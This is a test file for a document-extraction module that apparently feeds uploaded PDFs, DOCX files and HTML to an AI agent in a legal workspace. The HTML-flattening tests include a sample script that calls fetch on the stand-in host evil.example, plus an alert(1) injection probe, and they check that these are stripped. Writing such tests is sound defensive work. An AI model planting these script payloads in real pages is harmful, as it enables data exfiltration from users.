import { describe, it, expect } from 'vitest';
import {
  extractDocumentText,
  isExtractable,
  stripHtml,
  truncate,
  PDF_MIME,
  DOCX_MIME,
} from '@/lib/files/extract-text';
import { DOCUMENTS } from '@/config';
import { makePdf, makeImageOnlyPdf, makeDocx, toArrayBuffer } from './fixtures';

/**
 * Document extraction.
 *
 * Every case here runs against REAL bytes — a genuine PDF with a content
 * stream, a genuinely-deflated `.docx`. A fixture that was secretly a text file
 * would test the dispatch and none of the parsing, which is the half that can
 * actually go wrong.
 *
 * Each test maps to a sentence the README is entitled to say. "Supports PDF"
 * is only true if a scanned PDF says so rather than returning a blank document,
 * so that case is here too.
 */

const text = (s: string) => toArrayBuffer(new TextEncoder().encode(s));

describe('what the agent will accept', () => {
  it('accepts the document types a legal workspace actually receives', () => {
    for (const mime of [PDF_MIME, DOCX_MIME, 'text/plain', 'text/markdown', 'text/csv']) {
      expect(isExtractable(mime), mime).toBe(true);
    }
  });

  it('refuses types no extractor handles, rather than decoding them as text', async () => {
    expect(isExtractable('image/png')).toBe(false);
    expect(isExtractable('application/msword')).toBe(false); // legacy .doc is NOT .docx

    const result = await extractDocumentText(text('irrelevant'), 'image/png');
    expect(result.ok).toBe(false);
  });

  it('treats an empty file as a refusal, not as an empty document', async () => {
    const result = await extractDocumentText(new ArrayBuffer(0), PDF_MIME);
    expect(result).toEqual({ ok: false, reason: 'the file is empty' });
  });
});

describe('PDF', () => {
  it('extracts the text of a real PDF', async () => {
    const bytes = toArrayBuffer(
      makePdf(['Master Services Agreement', 'Between Acme Ltd and Beta GmbH']),
    );
    const result = await extractDocumentText(bytes, PDF_MIME);

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.kind).toBe('pdf');
    expect(result.text).toContain('Master Services Agreement');
    expect(result.text).toContain('Beta GmbH');
  });

  it('labels page boundaries so a citation can name a page', async () => {
    const result = await extractDocumentText(toArrayBuffer(makePdf(['Clause 1'])), PDF_MIME);
    expect(result.ok && result.text).toContain('[page 1]');
    expect(result.ok && result.pages).toBe(1);
  });

  /**
   * The one that matters most for a legal product. A scanned contract has no
   * text layer, and returning '' would read to the model as "this document is
   * blank" — a materially wrong answer to give about a contract.
   */
  it('SAYS a PDF has no text layer rather than reporting it as blank', async () => {
    const result = await extractDocumentText(toArrayBuffer(makeImageOnlyPdf()), PDF_MIME);

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.reason).toMatch(/no extractable text layer/);
    expect(result.reason).toMatch(/scan/);
  });

  it('reports a corrupt PDF as corrupt instead of throwing', async () => {
    const junk = toArrayBuffer(new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x00, 0x01, 0x02]));
    const result = await extractDocumentText(junk, PDF_MIME);

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.reason).toMatch(/could not be parsed|corrupt/);
  });
});

describe('DOCX', () => {
  it('extracts paragraphs from a real, deflate-compressed .docx', async () => {
    const bytes = toArrayBuffer(
      makeDocx(['Clause 1. Term.', 'Clause 2. Fees are payable in EUR.']),
    );
    const result = await extractDocumentText(bytes, DOCX_MIME);

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.kind).toBe('docx');
    expect(result.text).toContain('Clause 1. Term.');
    expect(result.text).toContain('payable in EUR');
  });

  it('unescapes XML entities rather than surfacing them to the model', async () => {
    const result = await extractDocumentText(
      toArrayBuffer(makeDocx(['Acme & Partners <Holdings>'])),
      DOCX_MIME,
    );
    expect(result.ok && result.text).toBe('Acme & Partners <Holdings>');
  });

  it('reports a corrupt .docx rather than throwing', async () => {
    const result = await extractDocumentText(text('not a zip at all'), DOCX_MIME);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.reason).toMatch(/could not be parsed/);
  });
});

/**
 * The bound the parsing libraries do not apply for you. A `.docx` of one
 * repeated glyph decompresses to megabytes; the file does not have to be
 * malicious to be pathological.
 */
describe('output is bounded, and says when it was', () => {
  it('truncates past the character ceiling and reports it', async () => {
    const long = 'x'.repeat(1_000);
    const result = await extractDocumentText(text(long), 'text/plain', 100);

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.text.length).toBeLessThanOrEqual(100);
    expect(result.truncated).toBe(true);
  });

  it('does not claim truncation when nothing was cut', async () => {
    const result = await extractDocumentText(text('short'), 'text/plain', 100);
    expect(result.ok && result.truncated).toBe(false);
  });

  it('a decompression bomb yields a bounded string, not megabytes', async () => {
    // 400k characters from a ~1 KB archive — the shape of the problem, at a
    // size a test can afford.
    const bytes = toArrayBuffer(makeDocx([`${'A'.repeat(400_000)}`]));
    const result = await extractDocumentText(bytes, DOCX_MIME, 5_000);

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.text.length).toBeLessThanOrEqual(5_000);
    expect(result.truncated).toBe(true);
  });

  it('the default ceiling comes from config, not from a literal in the module', () => {
    expect(DOCUMENTS.maxExtractedChars).toBeGreaterThan(0);
    expect(DOCUMENTS.maxPdfPages).toBeGreaterThan(0);
  });
});

describe('HTML flattening', () => {
  it('drops script and style bodies before the model sees them', () => {
    const flat = stripHtml(
      '<p>Hello</p><script>fetch("https://evil.example/?x=1")</script><style>p{}</style>',
    );
    expect(flat).toContain('Hello');
    expect(flat).not.toContain('evil.example');
    expect(flat).not.toContain('fetch');
  });

  it('is applied to uploaded HTML, not just to fetched pages', async () => {
    const result = await extractDocumentText(
      text('<h1>Title</h1><script>alert(1)</script>'),
      'text/html',
    );
    expect(result.ok && result.kind).toBe('html');
    expect(result.ok && result.text).not.toContain('alert');
  });
});

describe('truncate', () => {
  it('prefers a line break when one is close to the limit', () => {
    const { content, truncated } = truncate(`${'a'.repeat(90)}\n${'b'.repeat(50)}`, 100);
    expect(truncated).toBe(true);
    expect(content.endsWith('a')).toBe(true);
  });

  it('cuts mid-line when the nearest break is too far back', () => {
    const { content } = truncate(`a\n${'b'.repeat(200)}`, 100);
    expect(content.length).toBe(100);
  });
});
